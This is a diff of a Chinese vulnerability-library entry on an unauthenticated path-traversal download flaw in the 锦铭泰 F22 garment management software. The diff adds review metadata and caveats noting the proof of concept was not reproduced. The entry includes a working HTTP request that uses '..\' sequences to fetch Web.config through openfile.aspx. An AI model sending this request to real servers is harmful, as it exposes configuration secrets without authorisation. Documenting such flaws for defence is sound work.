@@ -1,23 +1,63 @@
 ---
-fofa: "+ 特征"
 source: "wy876 漏洞文库"
+title: "锦铭泰F22服装管理软件 openfile.aspx Url路径遍历下载"
+product: "锦铭泰F22服装管理软件"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+primary_identifiers: ""
+referenced_identifiers: ""
+identifier_status: "unknown"
+affected_scope: "版本未知，Windows反斜杠规范化"
+prerequisites: "前台未授权声称"
+side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
+review_date: "2026-10-02"
+source_url: "https://www.yuque.com/xiaokp7/ocvun2/ghu980augeuitr7e"
+source_status: "recorded"
+archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E9%94%A6%E9%93%AD%E6%B3%B0/%E5%B9%BF%E5%B7%9E%E9%94%A6%E9%93%AD%E6%B3%B0%E8%BD%AF%E4%BB%B6%E7%A7%91%E6%8A%80%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8F22%E6%9C%8D%E8%A3%85%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9Fopenfile.aspx%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD.md"
+fofa_unverified: "+ 特征"
+id: "vw-c5957ca8fdb065246037b1f8"
+entity_id: "ve-c5957ca8fdb065246037b1f8"
+schema_version: "1"
 ---
 
-# 广州锦铭泰软件科技有限公司F22服装管理软件系统openfile.aspx前台任意文件下载
+# 锦铭泰F22服装管理软件 openfile.aspx Url路径遍历下载
 
-# 一、漏洞简介
+## 条目说明
+
+- 对象与具体问题：锦铭泰F22服装管理软件；openfile.aspx Url路径遍历下载
+- 版本、配置及部署条件：版本未知，Windows反斜杠规范化
+- 认证与权限前提：前台未授权声称
+- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。
+
+## 证据边界与更正
+
+以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。
+
+- 只示Web.config相对读取，未证明跨应用任意路径或实际返回
+- /oa/isprit路径拼写须保持源样并核验，不擅自按相近OA路径纠正
+- Hunter/特征都空却fofa=+特征；简介漏接口的接字，无补丁
+
+## 操作风险
+
+现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+
+## 技术资料与来源记录
+
+## 一、漏洞简介
 广州锦铭泰软件科技有限公司，是一家专业为品牌服饰鞋包企业提供信息化解决方案的高科技企业，该公司开发的F22服装管理软件系统存在接口未授权访问，通过未授权的口/oa/isprit/module/openfile.aspx存在任意文件下载漏洞。攻击者最终可利用该漏洞获取敏感信息。
 
-# 二、影响版本
+## 二、影响版本
 + F22服装管理软件系统
 
-# 三、资产测绘
+## 三、资产测绘
 + hunter
 + 特征
 
 
-# 四、漏洞复现
-```plain
+## 四、漏洞复现
+```http
 GET /oa/isprit/module/openfile.aspx?Url=..\..\..\Web.config HTTP/1.1
 Host: xx.xx.xx.xx
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0
